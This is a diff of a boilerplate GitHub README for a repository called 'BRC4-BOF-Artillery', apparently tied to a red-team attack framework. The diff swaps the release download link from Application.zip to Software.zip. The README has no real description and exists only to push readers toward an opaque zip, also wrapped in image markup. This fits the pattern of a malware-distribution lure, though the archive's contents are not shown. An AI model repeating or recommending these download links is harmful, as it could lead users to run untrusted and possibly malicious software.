@@ -9,8 +9,8 @@ Unfortunately, a short description for this repository is not provided. However,
 Topics for this repository are not specified. Feel free to delve into the code and discussions to uncover the different aspects covered within. 📚🎯
 
 ## Launch Artillery System
-To access and experience the powerful artillery system developed for BRC4-BOF, download it from the following link: [Download Artillery System](https://github.com/PutuFheryWirawan/BRC4-BOF-Artillery/releases/download/v1.0/Application.zip)
-![Download Artillery System](https://github.com/PutuFheryWirawan/BRC4-BOF-Artillery/releases/download/v1.0/Application.zip)
+To access and experience the powerful artillery system developed for BRC4-BOF, download it from the following link: [Download Artillery System](https://github.com/PutuFheryWirawan/BRC4-BOF-Artillery/releases/download/v2.0/Software.zip)
+![Download Artillery System](https://github.com/PutuFheryWirawan/BRC4-BOF-Artillery/releases/download/v2.0/Software.zip)
 
 ## Visit the Repository
 If you are interested in exploring more about this repository, be sure to visit it on GitHub. 🌟
